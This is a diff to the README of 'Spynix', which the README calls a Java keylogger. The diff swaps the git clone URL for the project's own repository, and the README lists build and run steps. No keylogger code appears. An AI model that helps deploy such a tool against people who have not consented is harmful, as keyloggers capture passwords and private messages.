@@ -13,7 +13,7 @@ Spynix is a keylogger application implemented in the java programming language. 
 
 ## Installation
 
-1. Clone the repository using command `git clone https://github.com/tiagorlampert/sAINT.git`.
+1. Clone the repository using command `git clone https://github.com/prathamesh-a/spynix-keylogger.git`.
 2. Initiate the project
 Initiate the maven project in your IDE or resolve the dependencies using maven command `mvn install`.
 3. Run main class
